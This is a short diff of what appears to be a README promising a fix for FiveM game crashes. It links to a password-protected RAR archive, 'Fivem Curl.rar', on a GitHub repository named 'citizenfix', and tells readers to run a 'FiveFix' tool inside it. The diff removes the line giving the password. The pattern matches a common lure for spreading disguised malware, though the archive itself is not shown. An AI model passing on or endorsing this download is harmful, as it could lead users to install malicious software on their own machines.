@@ -2,8 +2,6 @@ Getting game crashes? Can't launch FiveM? Or maybe running into some more obscur
 
 📙Download Fivem Curl.rar : https://github.com/citizenfix/FIVEM/raw/main/Fivem%20Curl.rar
 
-🔑Password rar file : 123
-
 Read the text file 
 
 Run FiveFix and choose fix settings* then reinstall fivem
